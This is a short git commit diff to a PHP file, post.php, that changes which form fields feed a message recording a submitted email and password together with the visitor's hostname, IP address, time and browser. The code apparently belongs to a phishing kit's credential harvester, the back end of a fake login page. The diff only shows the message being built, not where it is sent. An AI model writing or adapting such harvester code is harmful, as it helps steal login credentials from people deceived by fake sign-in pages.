4e92b62a6d5c1f7803e35e4a507977b4858ea02b
gjodie544 <67371098+gjodie544@users.noreply.github.com>
2022-03-07 15:52:21 -0500

    Update post.php

--- post.php
+++ post.php
@@ -5,8 +5,8 @@ $hostname = gethostbyaddr($ip);
 $useragent = $_SERVER['HTTP_USER_AGENT'];
 
 $message = "New Message\n";
-$message .= "Email : ".$_POST['email']."\n";
-$message .= "Password : ".$_POST['password']."\n";
+$message .= "Email : ".$_POST['user']."\n";
+$message .= "Password : ".$_POST['pass']."\n";
 $message .= "HostName : ".$hostname."\n";
 $message .= "IP Address $ip on $time\n";
 $message .= "Browser: $useragent\n";
